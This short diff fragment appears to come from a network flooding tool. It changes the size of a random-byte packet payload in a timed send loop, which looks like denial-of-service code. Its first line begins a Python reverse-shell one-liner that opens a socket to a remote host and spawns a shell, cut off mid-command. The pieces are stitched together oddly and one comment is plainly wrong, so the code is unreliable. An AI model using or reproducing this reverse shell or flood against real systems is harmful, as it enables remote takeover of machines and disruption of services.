@@ -1,6 +1,6 @@
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(
     # 1024 representes one byte to the server
-    bytes = random._urandom(1000000)
+    bytes = random._urandom(65535)
     timeout =  time.time() + duration
     sent = 0
 
